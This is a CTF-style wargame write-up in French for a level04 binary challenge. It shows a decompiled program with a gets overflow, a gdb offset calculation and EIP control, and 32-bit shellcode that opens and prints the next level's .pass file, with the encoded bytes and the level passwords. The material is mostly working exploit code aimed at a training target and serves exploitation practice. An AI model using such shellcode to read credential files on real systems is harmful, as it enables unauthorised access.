```
level04 : kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
```

![](Pasted%20image%2020240808154350.png)
![](Pasted%20image%2020240808162440.png)

```c
undefined4 main(void)

{
  int iVar1;
  undefined4 *puVar2;
  byte bVar3;
  uint local_a4;
  undefined4 local_a0 [32];
  uint local_20;
  uint local_1c;
  long local_18;
  __pid_t pid;
  
  bVar3 = 0;
  pid = fork();
  puVar2 = local_a0;
  for (iVar1 = 32; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + (uint)bVar3 * -2 + 1;
  }
  local_18 = 0;
  local_a4 = 0;
  if (pid == 0) {
    prctl(1,1);
    ptrace(PTRACE_TRACEME,0,0,0);
    puts("Give me some shellcode, k");
    gets((char *)local_a0);
  }
  else {
    do {
      wait(&local_a4);
      local_20 = local_a4;
      if (((local_a4 & 0b01111111) == 0) ||
         (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0b01111111) + 1) >> 1)) {
        puts("child is exiting...");
        return 0;
      }
      local_18 = ptrace(PTRACE_PEEKUSER,pid,44,0);
    } while (local_18 != 11);
    puts("no exec() for you");
    kill(pid,9);
  }
  return 0;
}
```

## Calcul de loffset

```
gdb ./level04
set follow-fork-mode child
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3104]
0x41326641 in ?? ()
```

![](Pasted%20image%2020240808172123.png)

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

![](Pasted%20image%2020240808172356.png)

on contrôle correctement l'EIP

on créé une payload ASM qui va effectue les syscall open, read et write dans le stdout

```c
[bits 32]

[SECTION .text]

global _start
	xor		eax, eax
	xor		ebx, ebx
	;Prepare string
	push	eax		; '\0'
	push	0x73736170	; 'pass'
	push	0x2e2f3530	; '05/.'
	push	0x6c657665	; 'evel'
	push	0x6c2f7372	; 'rs/l'
	push	0x6573752f	; '/use'
	push	0x656d6f68	; 'home'
	push	0x2f2f2f2f	; '////'
	; Open file in read only
	mov	ebx, esp	; ebx = filename
	xor	ecx, ecx	; Read only
	xor	edx, edx	; mode 0
	mov	al, 5		; syscall open
	int	0x80		; call kernel
	mov	ebx, eax	; ebx => fd
	; Read file
	sub	esp, 40		; move stack for buffer
	lea	ecx, [esp]	; argument buffer
	mov	dl, 40		; argument size
	mov	al, 3		; syscall read
	int	0x80		; call kernel
	; Write
	mov	bl, 1		; argument fd
	mov	al, 4		; syscall write
	int	0x80		; call kernel
```

```
export LV4=`printf "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\xb0\x05\xcd\x80\x89\xc3\x83\xec\x28\x8d\x0c\x24\xb2\x28\xb0\x03\xcd\x80\xb3\x01\xb0\x04\xcd\x80"`
```

```
#include <stdio.h>
int		main(int ac, char **av, char**env)
{
	while (*env) {
		printf("%p - %s\n", *env, *env);
		env++;
	}
	return 0;
}
```

![](Pasted%20image%2020240808193932.png)
![](Pasted%20image%2020240808193703.png)
```
level05 : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```